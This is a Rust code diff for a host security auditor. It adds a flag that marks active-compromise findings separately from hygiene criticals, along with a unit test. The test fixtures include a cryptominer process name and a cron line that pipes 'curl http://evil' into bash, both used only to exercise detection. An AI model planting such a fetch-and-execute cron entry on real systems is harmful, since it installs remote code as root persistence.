@@ -925,6 +925,9 @@ pub struct CriticalFlags {
     pub sudo_nopasswd: bool,
     pub ntp_not_synced: bool,
     pub sysctl_issues_count: usize,
+    /// At least one active-compromise (IoC) finding fired. Orthogonal to the
+    /// hygiene flags above; drives a distinct exit code in main.rs.
+    pub compromised_host: bool,
 }
 
 impl CriticalFlags {
@@ -939,6 +942,9 @@ impl CriticalFlags {
                 .iter()
                 .any(|f| f.id == id && f.suppressed.is_none())
         };
+        // Active-compromise (IoC) finding IDs. SEC-018 is deliberately excluded:
+        // it is cron-persistence suspicion (weight 20), not a confirmed live IoC.
+        const IOC_IDS: [&str; 5] = ["SEC-015", "SEC-016", "SEC-017", "SEC-019", "DOCK-010"];
         let count_sysctl = findings
             .iter()
             .filter(|f| f.id == "SEC-007" && f.suppressed.is_none())
@@ -954,6 +960,7 @@ impl CriticalFlags {
             sudo_nopasswd: has("SEC-005"),
             ntp_not_synced: has("HYG-001"),
             sysctl_issues_count: count_sysctl,
+            compromised_host: IOC_IDS.iter().any(|&id| has(id)),
         }
     }
 
@@ -967,6 +974,15 @@ impl CriticalFlags {
             || self.sudo_nopasswd
             || self.ntp_not_synced
             || self.sysctl_issues_count >= SYSCTL_CRITICAL_THRESHOLD
+    }
+
+    /// True when at least one active-compromise (IoC) finding fired. Orthogonal
+    /// to `has_critical()`: a host can be compromised with no standard hygiene
+    /// critical, and vice-versa. main.rs maps this to a distinct exit code so
+    /// CI/CD can page (compromise) separately from failing the build (critical).
+    #[allow(dead_code)]
+    pub fn is_compromised(&self) -> bool {
+        self.compromised_host
     }
 }
 
@@ -1463,5 +1479,56 @@ mod tests {
         assert!(f.evidence.contains("executing in-memory (memfd)"));
         assert!(f.evidence.contains("root-run fileless implant"));
         assert!(!f.evidence.contains("deleted from /memfd:"));
+    }
+
+    #[test]
+    fn compromised_host_flag_tracks_ioc_findings() {
+        use crate::models::SuspiciousProcess;
+
+        // Clean report → no IoC finding → not compromised.
+        let clean = minimal_report();
+        let cf = CriticalFlags::from_report(&clean);
+        assert!(!cf.compromised_host);
+        assert!(!cf.is_compromised());
+
+        // An IoC (SEC-016 via a known-malware name) → compromised_host = true.
+        let mut r = minimal_report();
+        r.security.suspicious_processes = vec![SuspiciousProcess {
+            pid: 1337,
+            name: "xmrig".into(),
+            exe_path: Some("/tmp/xmrig".into()),
+            ..Default::default()
+        }];
+        let cf = CriticalFlags::from_report(&r);
+        assert!(cf.compromised_host, "SEC-016 must set compromised_host");
+        assert!(cf.is_compromised());
+
+        // A standard hygiene critical (firewall off → SEC-001) is NOT a compromise:
+        // has_critical() true, compromised_host false — the two are orthogonal.
+        let mut r = minimal_report();
+        r.network.firewall_active = false;
+        let cf = CriticalFlags::from_report(&r);
+        assert!(cf.has_critical(), "SEC-001 is a standard critical");
+        assert!(
+            !cf.compromised_host,
+            "hygiene critical must not set compromise"
+        );
+
+        // SEC-018 (cron persistence) must NOT count as compromise.
+        use crate::models::{CronJob, CronSeverity};
+        let mut r = minimal_report();
+        r.host.cron_jobs = vec![CronJob {
+            command: "* * * * * root curl http://evil | bash -c".into(),
+            severity: CronSeverity::Critical,
+        }];
+        let cf = CriticalFlags::from_report(&r);
+        assert!(
+            evaluate(&r).iter().any(|f| f.id == "SEC-018"),
+            "SEC-018 fires"
+        );
+        assert!(
+            !cf.compromised_host,
+            "cron persistence is not an active compromise"
+        );
     }
 }
